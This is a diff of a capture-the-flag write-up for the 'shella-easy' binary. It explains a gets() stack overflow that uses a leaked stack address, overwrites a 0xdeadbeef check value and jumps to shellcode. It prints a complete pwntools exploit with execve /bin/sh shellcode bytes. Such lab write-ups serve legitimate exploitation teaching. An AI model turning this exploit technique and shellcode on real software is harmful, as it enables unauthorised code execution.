@@ -2,73 +2,24 @@
 
 Let's take a look at the binary:
 
-```
-$	file shella-easy 
-shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
-$	./shella-easy 
-Yeah I'll have a 0xffd01f50 with a side of fries thanks
-15935728
-```
+![intro_data](pics/intro_data.png)
 
-So we can see that we are dealing with a 32 bit binary. When we run it, it prints out what looks like a stack address and prompts us for input. When we take a look at the main function, we see this:
 
-```
-/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
-/* WARNING: Removing unreachable block (ram,0x08048551) */
+So we can see that we are dealing with a 32 bit binary, with NX turned off (meaning the stack is executable). When we run it, it prints out what looks like a stack address and prompts us for input. When we take a look at the main function, we see this:
 
-void main(void)
+![main](pics/main.png)
 
-{
-  char input [64];
-  
-  setvbuf(stdout,(char *)0x0,2,0x14);
-  setvbuf(stdin,(char *)0x0,2,0x14);
-  printf("Yeah I\'ll have a %p with a side of fries thanks\n",input);
-  gets(input);
-                    /* WARNING: Subroutine does not return */
-  exit(0);
-}
-```
+So this is pretty similar to the other challenges in this module. There is a char array `input` which can hold 64 bytes, which it prints it's address. After that it runs the function `gets` with `input` as an argument, allowing us to do a buffer overflow attack and get the return address. With that we can get code execution. Our plan is to just push shellcode onto the stack (we can do this since NX is turned off, and we have a stack infoleak), and we know where it is thanks to the infoleak. Then we will overwrite the return address to point to the start of our shellcode. We will use shellcode that pops a shell for us when we run it. The shellcode I will use is from `http://shell-storm.org/shellcode/files/shellcode-827.php`.
 
-So this is pretty similar to the other challenges in this module. There is a char array `input` which can hold 64 bytes, which it prints it's address. After that it runs the function `gets` with `input` as an argument, allowing us to do a buffer overflow attack and get the return address. With that we can get code execution. Our plan is to just push shellcode onto the stack, and we know where it is thanks to the infoleak. Then we will overwrite the return address to point to the start of our shellcode. We will use shellcode that pops a shell for us when we run it. The shellcode I will use is from `http://shell-storm.org/shellcode/files/shellcode-827.php`.
+Also there is a slight problem with our plan. While in earlier versions of ghidra the decompiled code isn't correct, here it is. We can see there is a check on the `fakeStackCanary` value, and if it fails, `exit` is called. Since when `exit` is called, that means the `RET` instruction which gives us code execution is not called, which means we don't get code execution. We need to ensure this check does not pass, so `exit` is not called, and we get our code execution with the `RET` instruction. To do this, we need to ensure `fakeStackCanary` is equal to `0xdeadbeef` (it shows up as `-0x21524111` in the decompiled code, since that is the signed interpretation of that value):
 
-Also there is a slight problem with our plan. That is according to the decompiled code, the function `exit` is called. When this function is called, the `ret` instruction will not run in the context of this function, so we won't get our code execution. However the decompiled code isn't entirely correct. Looking at the assembly code gives us the full picture:
+![cmp_instruction](pics/cmp_instruction.png)
 
-```
-        08048539 e8 52 fe        CALL       gets                                             char * gets(char * __s)
-                 ff ff
-        0804853e 83 c4 04        ADD        ESP,0x4
-        08048541 81 7d f8        CMP        dword ptr [EBP + local_c],0xdeadbeef
-                 ef be ad de
-        08048548 74 07           JZ         LAB_08048551
-        0804854a 6a 00           PUSH       0x0
-        0804854c e8 4f fe        CALL       exit                                             void exit(int __status)
-                 ff ff
-                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
-                             LAB_08048551                                    XREF[1]:     08048548(j)  
-        08048551 b8 00 00        MOV        EAX,0x0
-                 00 00
-        08048556 8b 5d fc        MOV        EBX,dword ptr [EBP + local_8]
-        08048559 c9              LEAVE
-        0804855a c3              RET
-```
+So we can see that there is a check to see if `fakeStackCanary` is equal to `0xdeadbeef`, and if it is the function does not call `exit(0)` and we get our code execution. When we look at the stack layout in Ghidra, we see that this variable is within our means to overwrite (and it is at an offset of `0x40`). So we just need to overwrite it with `0xdeadbeef` and we will be good to go:
 
-So we can see that there is a check to see if `local_c` is equal to `0xdeadbeef`, and if it is the function does not call `exit(0)` and we get our code execution. When we look at the stack layout in Ghidra, we see that this variable is within our means to overwrite (and it is at an offset of `0x40`). So we just need to overwrite it with `0xdeadbeef` and we will be good to go:
+![stack_layout](pics/stack_layout.png)
 
-```
-                             **************************************************************
-                             *                          FUNCTION                          *
-                             **************************************************************
-                             undefined main()
-             undefined         AL:1           <RETURN>
-             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     08048556(R)  
-             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     0804851b(W), 
-                                                                                                   08048541(R)  
-             char[64]          Stack[-0x4c]   input                                   XREF[2]:     08048522(*), 
-                                                                                                   08048535(*)  
-```
-
-Next let's find the offset between the start of our input and the return address in gdb:
+Looking at the stack layout, we can see that `input` is stored at offset `0x4c`, and `fakeStackCanary` is stored at offset `0xc`. So the distance between the start of our input and `fakeStackCanary` should be `0x4c - 0xc = 0x40`. In addition to that, the offset from the start of our input and the return address should be `0x4c`. We can also find the offset between the start of our input and the return address in gdb:
 
 ```
 gef➤  disas main
@@ -173,7 +124,10 @@ Stack level 0, frame at 0xffffd070:
   ebx at 0xffffd064, ebp at 0xffffd068, eip at 0xffffd06c
 ```
 
-So we can see that the offset is `0xffffd06c - 0xffffd020 = 0x4c`. With that we have everything we need to make the exploit:
+So we can see that the offset is `0xffffd06c - 0xffffd020 = 0x4c`, between the start of our input and the saved return address. 
+
+So our payload will be this. We will start off with the shellcode. Then after the shellcode, we will add on filler bytes, until we reach offset `0x40` from the start of our input, which is the value we need to overwrite. We will place `0xdeadbeef` therem abd then the final `0x8` bytes to the return address. Then we will use the infoleak, and place the address of our shellcode there. With that we have everything we need to make the exploit:
+
 ```
 from pwn import *
 
@@ -182,17 +136,17 @@ target = process('./shella-easy')
 
 # Scan in the first line of text, parse out the infoleak
 leak = target.recvline()
-leak = leak.strip("Yeah I'll have a ")
-leak = leak.strip(" with a side of fries thanks\n")
+leak = leak.strip(b"Yeah I'll have a ")
+leak = leak.strip(b" with a side of fries thanks\n")
 shellcodeAdr = int(leak, 16)
 
 # Make the payload
-payload = ""
+payload = b""
 # This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php`
-payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-payload += "0"*(0x40 - len(payload)) # Padding to the local_c variable
+payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+payload += b"0"*(0x40 - len(payload)) # Padding to the local_c variable
 payload += p32(0xdeadbeef) # Overwrite the local_c variable with 0xdeadbeef
-payload += "1"*8 # Padding to the return address
+payload += b"1"*8 # Padding to the return address
 payload += p32(shellcodeAdr) # Overwrite the return address to point to the start of our shellcode
 
 # Send the payload
@@ -201,18 +155,8 @@ target.interactive()
 ```
 
 When we run the exploit:
-```
-$	python exploit.py 
-[+] Starting local process './shella-easy': pid 6434
-[*] Switching to interactive mode
-$ w
- 21:46:23 up  4:33,  1 user,  load average: 0.03, 0.08, 0.08
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu tty7     :0               17:14    4:33m  1:21   0.18s /sbin/upstart --user
-$ ls
-exploit.py  readme.md  shella-easy
-$  
-```
+
+![running_exploit](pics/running_exploit.png)
 
 Just like that we popped a shell. Also one more thing I want to show, the shellcode we push on the stack can be disassembled to assembly instructions. Let's break right at the `ret` instruction which executes our shellcode (I did this by editing the breakpoint in the exploit to `0x0804855a`, then running it):
 
